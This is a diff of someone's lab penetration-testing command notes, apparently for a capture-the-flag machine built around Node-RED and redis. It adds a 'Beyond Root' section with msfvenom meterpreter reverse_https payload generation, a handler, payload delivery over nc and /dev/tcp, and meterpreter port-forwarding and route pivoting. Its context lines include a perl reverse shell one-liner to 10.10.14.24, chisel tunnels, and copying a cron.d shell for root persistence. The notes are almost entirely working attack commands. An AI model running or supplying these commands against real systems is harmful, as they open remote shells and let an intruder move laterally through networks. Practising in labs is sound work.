@@ -8,10 +8,6 @@ sed -i 's/$oldip/$newip/g' *-CMD-by-CMDs.md
 # Get the id for /red/{id} 
 curl -X POST http://$IP:1880
 
-# Met - 0xdf metasploit pivoting
-msfvenom -p linux/x64/meterpreter_reverse_https LHOST=10.10.14.92 LPORT=4444 -f elf -o met
-
-msfconsole -qx "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter_reverse_https; set LHOST 10.10.14.24; set LPORT 4444; run"
 
 # Two is one and one is none
 perl -e 'use Socket;$i="10.10.14.24";$p=8002;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
@@ -121,7 +117,7 @@ bash -c "cat < /dev/tcp/172.19.0.4/10007 > /tmp/pspy64"
 rlwrap ncat -lvnp 10007
 # Then on the www machine as Root
 # Create a tunnel with chisel back to NodeRed client
-# nodered = 10000 because the kali serveris 10000 
+# nodered = 10000 because the kali server is 10000 
 nohup ./chisel client kali:10000 10007:127.0.0.1:10000 
 # www - to open 10007 on kali
 nohup ./chisel client 172.19.0.4:10007 10007:127.0.0.1:10007 &
@@ -148,4 +144,63 @@ sed -i 's/172.20.0.3/10.10.14.24/g' bigroot.sh
 sed -i 's/10007/10008/g' bigroot.sh
 cp bigroot.sh /mnt/tmp/
 cp /etc/cron.d/shell /mnt/etc/cron.d/
+```
+
+
+#### Beyond Root
+```bash
+# Get the id for /red/{id} 
+curl -X POST http://$IP:1880
+
+# Met - 0xdf metasploit pivoting
+msfvenom -p linux/x64/meterpreter_reverse_https LHOST=10.10.14.24 LPORT=4444 -f elf -o met
+
+msfconsole -qx "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter_reverse_https; set LHOST 10.10.14.24; set LPORT 4444; run"
+
+nc -lvnp 6969 < met
+
+
+bash -c "cat < /dev/tcp/10.10.14.24/6969 > /tmp/met"
+chmod +x met
+
+# Relaying and Pivoting
+# Exploit the RCE on redis
+msf6 > sessions -i 1
+meterpreter > portfwd add -l 10001 -r 172.19.0.2 -p 6379
+meterpreter > portfwd add -l 10000 -r 172.19.0.3 -p 80
+
+meterpreter > portfwd add -R -L tun0 -l 5555 -p 6666
+
+# To list
+meterpreter > portfwd list
+# To remove all at once
+meterpreter > portfwd flush
+
+# To add
+meterpreter > portfwd add -l 10000 -r 172.19.0.3 -p 80
+# To delete
+meterpreter > portfwd delete -l 10000 -r 172.19.0.3 -p 80
+
+msf6 > route add 172.18.0.0 172.18.0.5 1
+msf6 > route add 172.19.0.0 172.19.0.5 1
+
+
+
+```
+
+[Offensive Security Metasploit-Unleashed - portfwd ](https://www.offsec.com/metasploit-unleashed/portfwd/)
+[Abed Samhuri @medium - How to Implement Pivoting and Relaying Techniques Using Meterpreter](https://medium.com/axon-technologies/how-to-implement-pivoting-and-relaying-techniques-using-meterpreter-b6f5ec666795)
+
+Interesting extras
+```ruby
+msf > use auxiliary/scanner/portscan/tcp
+# No linux arp but 
+meterpreter > cat /proc/net/arp
+
+# If was windows:
+meterpreter > background
+msf6 > use post/linux/window/arp_scanner
+msf6 (arp_scanner) > set SESSION <id>
+msf6 (arp_scanner) > set RHOSTS 192.168.0.0/24
+msf6 (arp_scanner) > run
 ```
